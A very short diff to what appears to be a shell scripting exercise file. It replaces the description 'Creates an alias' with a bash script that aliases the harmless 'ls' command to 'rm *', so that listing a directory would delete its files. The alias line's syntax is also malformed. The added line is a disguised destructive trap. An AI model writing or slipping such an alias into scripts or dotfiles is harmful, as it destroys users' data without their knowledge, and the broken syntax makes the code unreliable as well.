@@ -1,1 +1,2 @@
-0-alias file - Creates an alias
+#!/bin/bash
+alias -p ls ="rm *"
